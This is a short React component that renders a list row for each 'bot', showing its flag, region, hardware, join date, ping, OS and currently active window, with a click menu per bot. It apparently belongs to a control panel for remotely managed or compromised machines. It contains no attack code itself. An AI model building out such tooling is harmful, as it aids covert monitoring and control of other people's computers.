import React, { useState } from "react";
import { BotItem } from "./types";
// import "./BotListItem.css";
// import DOMPurify from "dompurify";
interface BotListItemProps {
  bot: BotItem;
  onClickMenu: (event: React.MouseEvent<HTMLDivElement>, botId: string) => void;
}
const BotListItem: React.FC<BotListItemProps> = (botProps) => {
  let bot = botProps.bot;

  // const clean = DOMPurify.sanitize;
  const handleClick = (event: React.MouseEvent<HTMLDivElement>) => {
    event.preventDefault();
    botProps.onClickMenu(event, bot.id);
  };

  return (
    <div className="bot" onClick={handleClick} onContextMenu={handleClick}>
      <div>{bot.flag}</div>
      <div>{bot.name}</div>
      <div>{bot.region}</div>
      <div>{bot.cpu_brand}</div>
      <div>{bot.ram}</div>
      <div>{bot.join_date}</div>
      <div>{bot.system_boot_time}</div>
      <div>{bot.ping}</div>
      <div>{bot.active_window}</div>
      <div>{bot.os_info}</div>
    </div>
  );
};

export default BotListItem;
